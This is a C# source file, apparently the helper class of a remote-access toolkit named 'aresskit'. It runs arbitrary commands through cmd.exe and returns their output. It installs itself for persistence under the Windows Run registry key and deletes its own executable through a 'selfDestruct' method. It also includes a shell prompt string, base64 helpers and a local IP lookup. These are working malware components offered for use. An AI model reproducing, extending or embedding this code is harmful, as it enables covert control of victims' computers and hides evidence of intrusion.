using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace aresskit
{
    class Toolkit
    {
        public static string shellcode_ = Directory.GetCurrentDirectory() + "> ";
        public static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);

        public static string exec(string cmd)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output; // return output of command
        }

        // Thanks to: http://stackoverflow.com/a/6413615/5925502
        public static string GetLast(string source, int tail_length)
        {
            if (tail_length >= source.Length)
                return source;
            return source.Substring(source.Length - tail_length);
        }

        public static string GetFirst(string str, int maxLength)
        {
            return str.Substring(0, Math.Min(str.Length, maxLength));
        }

        public bool checkInternetConn(string server)
        {
            using (Ping pingSender = new Ping())
            {
                PingReply reply = pingSender.Send(server);
                return reply.Status == IPStatus.Success ? true : false;
            }
        }

        public static byte[] byteCode(string contents)
        {
            return System.Text.Encoding.ASCII.GetBytes(contents);
        }

        public static string ShowMethods(Type type)
        {
            string helpMenu = default(string);
            foreach (var method in type.GetMethods())
            {
                var parameters = method.GetParameters();
                var parameterDescriptions = string.Join
                    (", ", method.GetParameters()
                    .Select(x => x.ParameterType + " " + x.Name).ToArray());

                if (parameterDescriptions.ToString().Contains("System.Object") == false ||
                        method.Name.ToString() != "ToString" ||
                        method.Name.ToString() != "GetHashCode" ||
                        method.Name.ToString() != "GetType")
                {
                    if (parameterDescriptions == "")
                        helpMenu += type.Name + "::" + method.Name + "\n";
                    else
                        helpMenu += type.Name + "::" + method.Name + "(" + parameterDescriptions + ")\n";
                }
            }
            return helpMenu;
        }

        public void SetStartup()
        {
            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
        }

        public string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }

        // Thanks to: http://stackoverflow.com/a/11743162/5925502
        public string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }
        public byte[] Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return base64EncodedBytes;
        }

        /*
        public static void Main()
        {
            using (StreamWriter w = File.AppendText("log.txt"))
            {
                Log("Test1", w);
                Log("Test2", w);
            }

            using (StreamReader r = File.OpenText("log.txt"))
            {
                DumpLog(r);
            }
        }
        */

        // Thanks to: https://stackoverflow.com/a/1344242/8280922
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static void Log(string logMessage, TextWriter w)
        {
            w.Write(logMessage);
        }

        public static void DumpLog(StreamReader r)
        {
            string line;
            while ((line = r.ReadLine()) != null)
            {
                Console.WriteLine(line);
            }
        }

        public void selfDestruct()
        { exec("del " + System.Reflection.Assembly.GetEntryAssembly().Location); } // use 'del' command to delete self
    }
}
